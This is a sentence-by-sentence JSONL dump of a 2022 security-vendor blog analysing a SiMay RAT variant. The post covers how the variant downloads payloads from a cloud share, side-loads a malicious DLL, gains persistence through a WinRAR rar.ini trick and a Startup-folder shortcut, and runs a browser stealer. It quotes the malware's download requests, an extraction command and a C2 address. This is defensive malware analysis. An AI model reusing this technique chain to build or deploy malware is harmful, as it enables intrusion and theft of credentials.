{"id": "sentence_0x67c1466c", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x308bcff", "chapter_title": "Sneaky SiMay", "text": "By Andrew SheltonMay 31, 2022"}
{"id": "sentence_0xec62fd89", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x308bcff", "chapter_title": "Sneaky SiMay", "text": "Hackers have been abusing cloud services to host their malicious payloads and then use a downloader/loader to deploy them in the victims machine. Recently we came across a Remote Access Trojan (RAT) sample doing an activity on similar lines. This has been shared in VirusTotal. This sample was later identified as a variant of SiMay RAT. At the time of writing this blog, the sample under consideration had a low AV detection rate in VT, which further increased our curiosity to dive deeper into this. Not only that, there were also a few more samples of the SiMay RAT variant that were uploaded in VT with different hashes."}
{"id": "sentence_0x22bade0b", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x308bcff", "chapter_title": "Sneaky SiMay", "text": "While analysing the main sample, we identified it as a Multistage downloader/loader, which downloads the payload as a zip file (from the cloud service that is subscribed to by the attacker) and executes one of the legit executable with a malicious dll file (which are inside the zip) in memory using DLL sideloading method."}
{"id": "sentence_0xa665b8c4", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x308bcff", "chapter_title": "Sneaky SiMay", "text": "In this blog we will discuss how the SiMay RAT is downloaded as a payload from the cloud, deployed in the machine, its persistence and how it goes about loading the malicious DLL."}
{"id": "sentence_0x7ae0e938", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x308bcff", "chapter_title": "Sneaky SiMay", "text": "Figure 1: Workflow of SiMay RAT"}
{"id": "sentence_0xcb7ccfd1", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0xb63b378c", "chapter_title": "Sneaky SiMay", "text": "Uncategorized"}
{"id": "sentence_0xa07dd120", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0xa854be1d", "chapter_title": "Analysing the Binary", "text": "On analysing the sample, we noticed that the main loader has a Windows File Explorer icon , which can be deceiving to a user who can unknowingly execute the same."}
{"id": "sentence_0x4d1e8109", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0xa854be1d", "chapter_title": "Analysing the Binary", "text": "The executable was a VC8 compiled binary. The TimeDateStamp indicates it was compiled on 10th of April 2022. There were multiple URLs hard coded in the binary as shown in Figure 2. We will be getting into the deets of these URLs later in this blog during the payload download process."}
{"id": "sentence_0x648c2179", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0xa854be1d", "chapter_title": "Analysing the Binary", "text": "Figure 2: Hardcoded URLs in Binary"}
{"id": "sentence_0x9f0c26a", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x384c9ad3", "chapter_title": "Behavioural Analysis", "text": "The malware first tries to decrypt two executables that are already present in the data section. Code block for the same is shown in Figure 3"}
{"id": "sentence_0x6bf71702", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x384c9ad3", "chapter_title": "Behavioural Analysis", "text": "Figure 3: Decryption Loop for .NET Loaders"}
{"id": "sentence_0xf7a17b9d", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x384c9ad3", "chapter_title": "Behavioural Analysis", "text": "Figure 4: Decrypted .NET Binary"}
{"id": "sentence_0xbdf0d0b6", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x384c9ad3", "chapter_title": "Behavioural Analysis", "text": "The decrypted executables are .NET compiled binaries. While debugging we found that the first executable to be named as Cshape-CppHostingBridageAuto and is used for performing multiple operations like invoking a process, writing a binary from the memory and helping with resolving web request for the loader, and the second executable is named as CShapeHosting and is responsible for downloading the payload."}
{"id": "sentence_0x5b67b5bb", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x384c9ad3", "chapter_title": "Behavioural Analysis", "text": "Figure 5: Downloader Function in CShapeHosting executable"}
{"id": "sentence_0x6ceb7007", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x384c9ad3", "chapter_title": "Behavioural Analysis", "text": "The CShapeHosting will get the arguments from the Main Loader and tries to contact the ip 59.111.183[.]194 which is corresponding to the domain note.youdao.com (A Chinese cloud service provider) using GET request as:"}
{"id": "sentence_0x933f5564", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x384c9ad3", "chapter_title": "Behavioural Analysis", "text": "GET /yws/api/personal/share?method=get&shareKey=cfae45c9e7cc8a7734b72abe98235dd1 HTTP/1.0"}
{"id": "sentence_0x94c5e810", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x384c9ad3", "chapter_title": "Behavioural Analysis", "text": "Host: note.youdao[.]com"}
{"id": "sentence_0xa32dcb73", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x384c9ad3", "chapter_title": "Behavioural Analysis", "text": "To which the server responds with a JSON with interesting strings :"}
{"id": "sentence_0x7456ece3", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x384c9ad3", "chapter_title": "Behavioural Analysis", "text": "id:WEB842633ba1786c31f2996429d59ceca79,userId:quanshiyu2022@163.com,name: GUDUO, shareTime:1639822384952 (2021-12-18)"}
{"id": "sentence_0x60a60488", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x384c9ad3", "chapter_title": "Behavioural Analysis", "text": "We can see that a share has been activated way before the malware binary was compiled, showing that the malware actors had spent quite some time planning this campaign."}
{"id": "sentence_0xd06fb317", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x384c9ad3", "chapter_title": "Behavioural Analysis", "text": "After parsing the JSON data, the malware creates another GET request as:"}
{"id": "sentence_0xb378f117", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x384c9ad3", "chapter_title": "Behavioural Analysis", "text": "GET /yws/public/notebook/cfae45c9e7cc8a7734b72abe98235dd1/subdir/WEB842633ba1786c31f2996429d59ceca79 HTTP/1.0"}
{"id": "sentence_0x5137be07", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x384c9ad3", "chapter_title": "Behavioural Analysis", "text": "As we can see the subdir/WEB842633ba1786c31f2996429d59ceca79 is retrieved from the JSON data. Now the server replies with yet another JSON data which contains interesting information for the payloads that is stored in the attackers share that includes the necessary keys for accessing the file like a web path p:/<PATH_TO_FILE> and file name tl:<FILE_NAME>.zip"}
{"id": "sentence_0xc4842b9a", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x384c9ad3", "chapter_title": "Behavioural Analysis", "text": "For the sample under analysis, the share contains around 27 malicious payloads."}
{"id": "sentence_0x14c2650f", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x384c9ad3", "chapter_title": "Behavioural Analysis", "text": "It now takes one of the zip file and tries to download it with another GET request as:"}
{"id": "sentence_0x53ecdcb8", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x384c9ad3", "chapter_title": "Behavioural Analysis", "text": "GET /yws/api/personal/file/WEB4e6116b430403afd518512b82258a50d?method=download&shareKey=cfae45c9e7cc8a7734b72abe98235dd1 HTTP/1.0"}
{"id": "sentence_0x3796aa6e", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x384c9ad3", "chapter_title": "Behavioural Analysis", "text": "Here id WEB4e6116b430403afd518512b82258a50d is retrieved from the previous JSON data, for which the server replies with the direct path to the malicious zip file (in our case it is o.zip) to be downloaded. The sample is then downloaded to the %USER%/Public/<root> folder."}
{"id": "sentence_0x449ea706", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x384c9ad3", "chapter_title": "Behavioural Analysis", "text": "Figure 6: Multiple Payloads from YouDao Cloud Share seen in a Web Interface"}
{"id": "sentence_0xf3fe7b3a", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x522f7da9", "chapter_title": "Analysing the Payload Archive", "text": "The contents of the zip file will look like this :"}
{"id": "sentence_0x74b1fe33", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x522f7da9", "chapter_title": "Analysing the Payload Archive", "text": "Figure 7: Contents of Zip Archive"}
{"id": "sentence_0x919c1596", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x522f7da9", "chapter_title": "Analysing the Payload Archive", "text": "The main sample then extracts and writes the contents from the zip file to predefined locations as below:"}
{"id": "sentence_0x1ee3071c", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x522f7da9", "chapter_title": "Analysing the Payload Archive", "text": "Contents of the folder named package are copied to C:\\Users\\Public\\Documents\\efender\\<random_name>\\<files> which consist of the malicious DLL (GLUT32.dll), a legit executable exe (washost.exe) in which the DLL will be side-loaded later, and an XML file which will be used by the DLL later in the execution chain."}
{"id": "sentence_0xf649b391", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x522f7da9", "chapter_title": "Analysing the Payload Archive", "text": "Contents of the folder named static are copied to C:\\ProgramData\\ as Windows-updatadfinder-CProgramData which will be used as a stealer and will be explained later in the blog."}
{"id": "sentence_0xa3811cae", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x522f7da9", "chapter_title": "Analysing the Payload Archive", "text": "Content of the folder name winzipper (fdaf1.fda1gfq) is copied to C:\\Users\\Public\\Downloads which is a command line version of WinRAR. This file is used for creating persistence for the payload."}
{"id": "sentence_0x87598c3f", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x9b7b09f9", "chapter_title": "Creating Persistence", "text": "After extracting the payloads, the malware uses the WinRAR vulnerability to create persistence where the WinRAR CLI payload comes into play. First, it creates a rar.ini file in the Public\\Downloads folder that has the string switches=-opC:\\Users\\<user_name>\\AppData\\Roaming y, as the WinRAR CLI can read the set of switches from the rar.ini. This switch describes the default location for the archive to be decompressed."}
{"id": "sentence_0xef5135b9", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x9b7b09f9", "chapter_title": "Creating Persistence", "text": "Now the malware creates an lnk file in C:\\Users\\Public\\Downloads\\mobisample_start.lnk targeting the exe payload from C:\\Users\\Public\\Documents\\efender\\<random_name>\\<executable_name>."}
{"id": "sentence_0xc2f82ba0", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x9b7b09f9", "chapter_title": "Creating Persistence", "text": "Figure 8: Function to Create LNK file"}
{"id": "sentence_0xaa76a4e2", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x9b7b09f9", "chapter_title": "Creating Persistence", "text": "The created lnk file is then compressed to <random>.rar file in the same location by the WinRAR CLI tool with arguments as seen in Figure 9."}
{"id": "sentence_0x7ed579f", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x9b7b09f9", "chapter_title": "Creating Persistence", "text": "Figure 9: Argument for WinRAR CLI tool"}
{"id": "sentence_0x7f524", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x9b7b09f9", "chapter_title": "Creating Persistence", "text": "Another lnk file is then created by the malware with a random name in the path C:\\Users\\Public\\Music which has the target as :"}
{"id": "sentence_0xa7ba75fa", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x9b7b09f9", "chapter_title": "Creating Persistence", "text": "C:\\Users\\Public\\Downloads\\<winrar_CLI>.exe x C:\\Users\\Public\\Downloads\\<random>.rar"}
{"id": "sentence_0x870f1a1e", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x9b7b09f9", "chapter_title": "Creating Persistence", "text": "where the argument x is used for extracting files with a full path. The malware then creates an instance of explorer.exe with the address as C:\\Users\\Public\\Music and runs in the background with the help of CppHostingBridageAuto as shown in the Figure below."}
{"id": "sentence_0x2881cc1b", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x9b7b09f9", "chapter_title": "Creating Persistence", "text": "Figure 10: Call to CppHostingBridageAuto from Loader"}
{"id": "sentence_0x11a986cd", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x9b7b09f9", "chapter_title": "Creating Persistence", "text": "Figure 11: Auto Function responsible for Invoking Explorer"}
{"id": "sentence_0x8633dba7", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x9b7b09f9", "chapter_title": "Creating Persistence", "text": "The invoked explorer.exe is then used to start the lnk file that was created in Public\\Music folder which will now extract the archived lnk file mobisample_start.lnk to the %Appdata%\\Roaming\\ Microsoft\\Windows\\Start Menu\\Programs\\startup folder. There by achieving persistence."}
{"id": "sentence_0xc978f362", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x3ec2bc73", "chapter_title": "Executing the Payload", "text": "After creating persistence, the malware renames the dropped file Windows-updatadfinder-CProgramData from ProgramData to Shell.txt which contains the shell code which will be used by the payload to perform the stealer activity."}
{"id": "sentence_0x1a75e772", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x3ec2bc73", "chapter_title": "Executing the Payload", "text": "To execute the payload, the malware then creates a URL file in the path C:\\Users\\Public\\Music, which will be executed using the already invoked explorer process."}
{"id": "sentence_0xa6984207", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x3ec2bc73", "chapter_title": "Executing the Payload", "text": "Figure 12: Target of the URL file"}
{"id": "sentence_0xa7bd526e", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x3ec2bc73", "chapter_title": "Executing the Payload", "text": "The payload <random>.exe then gets executed with the GLUT32.dll side-loaded, whereas the export functions of the DLL have the same name as available in the genuine version of the DLL. We also identified that the DLL has strings Blackmoon which corresponds to a Chinese compiler used in the 2014 KrBanker Trojan attack in South Korea."}
{"id": "sentence_0x8ed46043", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x3ec2bc73", "chapter_title": "Executing the Payload", "text": "Figure 13: Malicious DLL sideloaded to legit executable"}
{"id": "sentence_0xf335f56", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x3ec2bc73", "chapter_title": "Executing the Payload", "text": "We noticed that all the export functions in the sideloaded DLL do the same task by calling a same function which decrypts the xml file wc.xml and then uses the contents to create a new shell.ini file in C:\\programdata\\shell.ini. The shell.ini file contains the C2 servers IP address that the payload needs to contact."}
{"id": "sentence_0xf5e7e7ed", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x3ec2bc73", "chapter_title": "Executing the Payload", "text": "Figure 14: Contents of shell.ini file"}
{"id": "sentence_0x24b3a899", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x3ec2bc73", "chapter_title": "Executing the Payload", "text": "The shell.txt contains shell code to import modules and a PE file (encrypted) where each byte is XORed by 25h. Further, the decrypted PE file had the original DLL name as server.dll. It also had multiple strings related to different browser names and their paths for user data this dll acts as a stealer for the RAT."}
{"id": "sentence_0x4343aa", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x3ec2bc73", "chapter_title": "Executing the Payload", "text": "Figure 15: Suspicious strings in the Encrypted shell.txt file"}
{"id": "sentence_0x40c036b8", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x3ec2bc73", "chapter_title": "Executing the Payload", "text": "This PE file will then be loaded into the memory space of the payload process and does the stealer activity when the attacker commands. The stolen data is then sent to the C2 server by the payload."}
{"id": "sentence_0xaa90765", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x3ec2bc73", "chapter_title": "Executing the Payload", "text": "Figure 16: Payload contacting C2"}
{"id": "sentence_0x53aab43b", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x3ec2bc73", "chapter_title": "Executing the Payload", "text": "We at K7 Labs provide detection against latest threats and also for this newer variant of SiMay RAT. Users are advised to use a reliable security product such as K7 Total Security and keep it up-to-date so as to safeguard their devices."}
{"id": "sentence_0xbc4ea9f7", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x5c1e1d51", "chapter_title": "C2 :", "text": "202.8.121[.]28"}
{"id": "sentence_0x16548c37", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x8c7d3284", "chapter_title": "Like what you're reading? Subscribe to our top stories.", "text": "If you want to subscribe to our monthly newsletter, please submit the form below."}
{"id": "sentence_0xd849336b", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x8c7d3284", "chapter_title": "Like what you're reading? Subscribe to our top stories.", "text": "Email* :"}
{"id": "sentence_0x340fb54b", "report_id": "report_0xe698d91e", "report_date": "2022-05-31T00:00:00Z", "report_title": "Sneaky SiMay", "report_url": "https://labs.k7computing.com/index.php/sneaky-simay", "chapter_id": "chapter_0x8c7d3284", "chapter_title": "Like what you're reading? Subscribe to our top stories.", "text": "Previous Post Steer Clear of Instant Loan Apps Next Post"}
